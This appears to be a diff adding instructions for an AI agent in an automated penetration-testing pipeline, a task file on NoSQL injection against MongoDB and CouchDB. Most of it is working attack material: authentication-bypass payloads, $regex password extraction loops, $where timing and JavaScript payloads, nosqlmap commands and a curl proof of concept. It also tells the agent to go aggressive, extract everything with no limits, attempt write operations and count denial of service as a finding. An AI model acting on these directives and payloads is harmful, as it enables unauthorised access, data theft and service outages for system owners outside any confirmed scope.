@@ -1,0 +1,440 @@
+# Task 45: NoSQLMap - MongoDB/CouchDB Injection Testing
+# ==============================================================================
+# JULES AI AGENT INSTRUCTIONS - FULL BRAIN MODE
+# ==============================================================================
+
+## TASK IDENTITY
+- **Task Number**: 45
+- **Task Name**: NoSQLMap - MongoDB/CouchDB Injection Testing
+- **Category**: Phase 4 - Injection Testing
+- **Depends On**: Task 35 (Nuclei tech detection), Task 43/44 (SQLi failures)
+- **AI Brain**: nosqlmap_scanner.py
+
+## PURPOSE
+Test for NoSQL injection vulnerabilities that are DIFFERENT from SQL injection:
+- MongoDB $ne, $regex, $where operators
+- CouchDB view injection
+- JSON-based query manipulation
+- Authentication bypass via injection
+
+## WHY SEPARATE FROM SQLMAP?
+
+NoSQL databases have COMPLETELY DIFFERENT syntax:
+```
+SQL:       SELECT * FROM users WHERE user='admin' AND pass='xxx'
+MongoDB:   db.users.find({user: 'admin', pass: 'xxx'})
+
+SQL SQLi:  ' OR '1'='1
+MongoDB:   {"$ne": ""} or {"$gt": ""}
+```
+
+## INPUT FILES
+
+```
+PRIMARY SOURCES:
+├── outputs/sqli/nosqlmap_targets.txt            # Failed SQLi targets (might be NoSQL)
+├── outputs/nuclei/tech_stack.json               # MongoDB detected hosts
+├── outputs/api_endpoints_live.txt               # API endpoints (often use MongoDB)
+├── outputs/queue_api_endpoints_kiterunner.txt   # Kiterunner API endpoints
+
+SECONDARY SOURCES:
+├── outputs/queue_dynamic_endpoints_urls.txt     # Any parameterized URLs
+├── outputs/har/common_data.json                 # HAR-extracted requests
+```
+
+## OUTPUT FILES
+
+```
+outputs/nosql/
+├── nosql_vulnerable.txt          # Confirmed NoSQL injection URLs
+├── nosql_possible.txt            # Possible NoSQL injection
+├── nosql_full_results.json       # Complete scan results
+├── auth_bypass_found.txt         # Authentication bypass vulnerabilities
+
+outputs/vulnerabilities/
+├── NOSQLI-{hash}-CRITICAL.md     # Per-vulnerability reports
+└── AUTH-BYPASS-{hash}-CRITICAL.md # Auth bypass reports
+```
+
+## NOSQL INJECTION TECHNIQUES
+
+### 1. MongoDB Operator Injection
+
+```json
+// Authentication bypass
+{
+  "username": {"$ne": ""},
+  "password": {"$ne": ""}
+}
+
+// Always-true condition
+{
+  "username": {"$gt": ""},
+  "password": {"$gt": ""}
+}
+
+// Regex extraction
+{
+  "username": "admin",
+  "password": {"$regex": "^a"}
+}
+```
+
+### 2. $where Clause Injection
+
+```json
+// Boolean extraction
+{
+  "$where": "this.password.match(/^a/) && sleep(5000)"
+}
+
+// Data exfiltration via timing
+{
+  "$where": "function() { if(this.password[0] == 'a') sleep(5000); return true; }"
+}
+```
+
+### 3. Array Injection
+
+```json
+// Bypass array checks
+{
+  "username[$ne]": "",
+  "password[$ne]": ""
+}
+```
+
+### 4. URL Parameter Injection
+
+```
+# Standard form to injection form
+?username=admin&password=secret
+?username[$ne]=&password[$ne]=
+?username[$gt]=&password[$gt]=
+?username[$regex]=.*&password[$regex]=.*
+```
+
+### 5. JSON Body Injection
+
+```http
+POST /api/login HTTP/1.1
+Content-Type: application/json
+
+{"username": {"$ne": ""}, "password": {"$ne": ""}}
+```
+
+## TARGET IDENTIFICATION
+
+### How to identify NoSQL targets:
+
+```yaml
+From Nuclei (Task 35):
+  - tech_to_hosts['MongoDB']
+  - tech_to_hosts['CouchDB']
+  - tech_to_hosts['Express'] (often uses MongoDB)
+  - tech_to_hosts['Node.js'] (often uses MongoDB)
+
+From URL patterns:
+  - /api/ endpoints
+  - /graphql endpoints
+  - JSON content-type endpoints
+  - /mongo/, /nosql/, /db/ paths
+
+From SQLi failures:
+  - URLs that failed SQLi but accepted JSON
+  - Endpoints with JSON error messages
+```
+
+## AI BRAIN: nosqlmap_scanner.py
+
+```
+Class Structure:
+├── NoSQLTargetCollector
+│   ├── collect_from_nuclei()      # MongoDB hosts from Task 35
+│   ├── collect_from_sqli_failures() # From Task 44
+│   ├── collect_from_apis()        # API endpoints
+│   └── prioritize()               # Score by NoSQL likelihood
+│
+├── NoSQLMapScanner
+│   ├── scan_target()              # Main scan entry
+│   ├── _test_operator_injection() # $ne, $gt, $regex
+│   ├── _test_where_injection()    # $where clause
+│   ├── _test_auth_bypass()        # Login forms
+│   ├── _test_url_params()         # ?param[$ne]= 
+│   └── _test_json_body()          # JSON POST body
+│
+├── AuthBypassTester
+│   ├── detect_login_forms()       # Find login endpoints
+│   ├── test_bypass_techniques()   # Try all bypass methods
+│   └── verify_bypass()            # Confirm bypass worked
+│
+└── PayloadGenerator
+    ├── generate_operator_payloads()
+    ├── generate_regex_payloads()
+    ├── generate_where_payloads()
+    └── generate_timing_payloads()
+```
+
+## NOSQLMAP TOOL COMMANDS
+
+### Using nosqlmap CLI:
+```bash
+# Basic scan
+nosqlmap -u "http://target.com/api/users" --payload-list
+
+# MongoDB injection test
+nosqlmap -u "http://target.com" --method POST \
+    --data '{"user":"test","pass":"test"}' \
+    --attack 1
+
+# Authentication bypass
+nosqlmap -u "http://target.com/login" --method POST \
+    --data '{"username":"admin","password":"test"}' \
+    --attack 2
+```
+
+### Manual Testing Requests:
+```python
+# Operator injection
+requests.post(url, json={
+    "username": {"$ne": ""},
+    "password": {"$ne": ""}
+})
+
+# URL parameter injection
+requests.get(url + "?username[$ne]=&password[$ne]=")
+
+# Regex injection for password extraction
+for char in string.printable:
+    payload = {"username": "admin", "password": {"$regex": f"^{known_chars}{char}"}}
+    # If response differs, char is correct
+```
+
+## PAYLOAD LIST
+
+### Operator Payloads:
+```json
+{"$ne": ""}
+{"$ne": null}
+{"$gt": ""}
+{"$gte": ""}
+{"$lt": "zzzzz"}
+{"$exists": true}
+{"$regex": ".*"}
+{"$regex": "^"}
+{"$in": ["admin", "root", "administrator"]}
+```
+
+### Where Payloads:
+```javascript
+"1; sleep(5000)"
+"1; return true"
+"function() { return true; }"
+"this.password.match(/.*/) && sleep(5000)"
+```
+
+### URL Parameter Payloads:
+```
+[$ne]=
+[$gt]=
+[$regex]=.*
+[$where]=1
+[$or][0][username]=admin
+```
+
+## DETECTION METHODS
+
+### Time-based Detection:
+```python
+# Send payload with sleep
+start = time.time()
+response = requests.post(url, json={
+    "$where": "sleep(5000)"
+})
+elapsed = time.time() - start
+
+if elapsed > 5:
+    print("Time-based NoSQL injection!")
+```
+
+### Boolean-based Detection:
+```python
+# True condition
+resp_true = requests.post(url, json={
+    "username": {"$ne": ""}
+})
+
+# False condition  
+resp_false = requests.post(url, json={
+    "username": {"$eq": "nonexistent_user_12345"}
+})
+
+if len(resp_true.content) != len(resp_false.content):
+    print("Boolean-based NoSQL injection!")
+```
+
+### Error-based Detection:
+```python
+# Malformed query
+response = requests.post(url, json={
+    "username": {"$unknown": ""}
+})
+
+if "unknown operator" in response.text.lower():
+    print("Error-based NoSQL injection!")
+```
+
+## VULNERABILITY REPORT TEMPLATE
+
+```markdown
+# NoSQL Injection: NOSQLI-{hash}
+
+## Summary
+| Field | Value |
+|-------|-------|
+| **ID** | NOSQLI-{hash} |
+| **URL** | {url} |
+| **Type** | MongoDB Operator Injection |
+| **Technique** | $ne authentication bypass |
+| **Impact** | Authentication bypass, Data extraction |
+| **Severity** | CRITICAL |
+
+## Vulnerable Parameter
+- **Name**: password
+- **Original**: "secret123"
+- **Payload**: {"$ne": ""}
+
+## Proof of Concept
+```bash
+curl -X POST http://target.com/login \
+  -H "Content-Type: application/json" \
+  -d '{"username": "admin", "password": {"$ne": ""}}'
+```
+
+## Response Comparison
+| Payload | Status | Length | Time |
+|---------|--------|--------|------|
+| Normal | 401 | 234 | 0.1s |
+| {"$ne": ""} | 200 | 1024 | 0.1s |
+
+## Impact
+- Full authentication bypass
+- Access to admin account
+- Potential for data extraction via $regex
+
+## Recommendations
+1. Use mongoose with strict mode
+2. Validate input types (reject objects for string fields)
+3. Implement query sanitization
+4. Use parameterized queries where possible
+```
+
+## EXECUTION FLOW
+
+```
+1. COLLECT TARGETS
+   ├── Load MongoDB hosts from Nuclei (Task 35)
+   ├── Load SQLi failures from Task 44
+   ├── Load API endpoints from Tasks 17-18
+   └── Prioritize by NoSQL likelihood
+
+2. FOR EACH TARGET:
+   a. Detect content type (JSON vs form)
+   b. Test operator injection ($ne, $gt, $regex)
+   c. Test URL parameter injection
+   d. If login form, test auth bypass
+   e. Test $where injection (careful - can cause DoS)
+
+3. DATA EXTRACTION (if injectable):
+   a. Use $regex to extract data character by character
+   b. Enumerate collections (if $where works)
+   c. Extract sensitive documents
+
+4. GENERATE REPORTS
+   └── Per-vulnerability: NOSQLI-{hash}-CRITICAL.md
+```
+
+## TIME MANAGEMENT
+
+```
+NoSQL injection testing is FASTER than SQLi:
+- Simple operator tests: 1-2 seconds
+- Auth bypass test: 5-10 seconds
+- $regex extraction: 30-60 seconds per field
+
+Batch limit: ~100 URLs in 9 minutes
+```
+
+## EXPLOITATION RULES
+
+```
+1. YOUR target = GO AGGRESSIVE with $where
+2. Use $regex freely - DoS is also a finding
+3. NO LIMITS on extraction - get everything
+4. TEST auth bypass on ALL endpoints
+5. TRY write operations - $set, $push = CRITICAL finding
+```
+
+## HOW TO RUN
+
+```bash
+# Full NoSQL injection scan
+python nosqlmap_scanner.py --workspace d:\wallet\Mylab
+
+# Focus on API endpoints
+python nosqlmap_scanner.py --workspace d:\wallet\Mylab --api-only
+
+# Test specific URL
+python nosqlmap_scanner.py --workspace d:\wallet\Mylab --url "http://target/api/login"
+
+# Resume scan
+python nosqlmap_scanner.py --workspace d:\wallet\Mylab --resume
+```
+
+## INTEGRATION CHAIN
+
+```
+Task 35 (Nuclei)  ─┐
+                   ├─► Task 45 (NoSQLMap) ─► vulnerabilities/
+Task 44 (SQLMap)  ─┘
+     │
+     └─► nosqlmap_targets.txt (SQLi failures that might be NoSQL)
+```
+
+## AI AGENT CREATIVITY DIRECTIVE
+
+┌─────────────────────────────────────────────────────────────────────────────┐
+│                    🧠 YOU ARE AN INTELLIGENT AGENT 🧠                       │
+├─────────────────────────────────────────────────────────────────────────────┤
+│ NoSQL injection is DIFFERENT from SQL injection. Think differently.         │
+│                                                                             │
+│ OBSERVE THE DATA FORMAT:                                                    │
+│                                                                             │
+│ 1. Is it JSON? → Try operator injection: {"$ne": ""}                        │
+│ 2. Is it URL params? → Try: username[$ne]=&password[$ne]=                   │
+│ 3. Mixed format? → Try BOTH approaches                                      │
+│                                                                             │
+│ THINK ABOUT CONTEXT:                                                        │
+│                                                                             │
+│ • LOGIN endpoint? → Auth bypass is primary goal                             │
+│   - {"user": {"$gt": ""}, "pass": {"$gt": ""}} = bypass auth               │
+│                                                                             │
+│ • SEARCH endpoint? → Data extraction is the goal                            │
+│   - Use $regex to extract data character by character                       │
+│   - {"secret": {"$regex": "^a"}} → iterate alphabet                         │
+│                                                                             │
+│ • API endpoint? → Look for query operators in docs                          │
+│   - $where allows JavaScript execution!                                     │
+│   - $regex can extract sensitive fields                                     │
+│                                                                             │
+│ ADAPT BASED ON RESPONSE:                                                    │
+│                                                                             │
+│ • Different response length? → Boolean-based extraction works               │
+│ • Same response always? → Try time-based with $where + sleep                │
+│ • Error messages? → Read them - they reveal operator support                │
+│                                                                             │
+│ CREATE YOUR OWN PAYLOADS:                                                   │
+│ • Combine operators: {"$and": [{"user": {"$regex": "^admin"}}, ...]}        │
+│ • Try $where for RCE: {"$where": "sleep(5000)"}                             │
+│ • Chain findings: auth bypass → access admin → find more vulns              │
+└─────────────────────────────────────────────────────────────────────────────┘
